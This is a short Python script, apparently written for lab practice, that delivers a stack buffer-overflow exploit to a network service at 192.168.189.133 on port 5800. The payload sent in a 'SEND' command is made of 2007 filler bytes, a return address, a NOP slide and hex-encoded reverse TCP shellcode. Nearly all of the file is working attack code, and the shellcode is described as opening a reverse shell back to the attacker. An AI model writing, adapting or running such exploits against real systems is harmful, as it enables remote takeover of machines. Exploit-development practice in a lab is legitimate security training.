import socket

# Badchars \x00
# Rerverse TCP shellcode
shellcode = ("bd78b81226dbd0d97424f45b29c9"
"b15283ebfc316b0e0313b6f0d31f"
"2e761bdfaf17953a9e17c14fb1a7"
"811d3e43c7b5b521c0ba7e8f36f5"
"7fbc0b9403bf5f763d7092777a6d"
"5f25d3f9f2d950b7ce522a595787"
"fb58761677035899543fd181b97a"
"ab3a09f02aea43f981d36b08db14"
"4bf3ae6caf8ea8abcd543c2f751e"
"e68b87f371588bb8f606883fda3d"
"b4b4dd913c8ef9356454636cc03b"
"9c6eabe438e546f030a40e357956"
"cf510a25fdfea0a14d766f36b1ad"
"d7a84c4e28e18a1a78993b231359"
"c3f6b4096ba974f9cb191d13c446"
"3d1c0eefd4e7d9d0815a99b9d3a4"
"9b825d42f1e40bdd6e9c11950f61"
"8cd010e92325de1a4935b7ea0467"
"1ef4b20ffc6759cf8b9bf698dc6a"
"0f4cf1d5b97208838236d7700cb7"
"9acd2aa762cd76933a98204dfd72"
"832757284daf2e024ea92e4f3855"
"9e267d6a2faf89134d4f75ced56f"
"94da2318018f8945b27acd73318e"
"ae8729fbabcced10c65d9816755d"
"89")
dados_hex = "A" * 2007 


#  Returm address
hex = "a0125062"  
# NOP Slide
strings = bytes.fromhex("90")



# Função para converter caracteres HEX em bytes
def hex_to_bytes(hex_string):
    return bytes.fromhex(''.join(hex_string.split()))

# Convertendo os dados HEX para bytes
dados_hex_bytes = hex_to_bytes(hex)

# Configurando a conexão do socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.189.133", 5800))
teste = s.recv(1024)

# Concatenando os bytes para formar o comando
command = b"SEND " + bytes(dados_hex,'utf-8') + dados_hex_bytes + strings * 32 + hex_to_bytes(shellcode) + b"\r\n"

# Enviando o comando através do socket
s.send(command)
s.close()
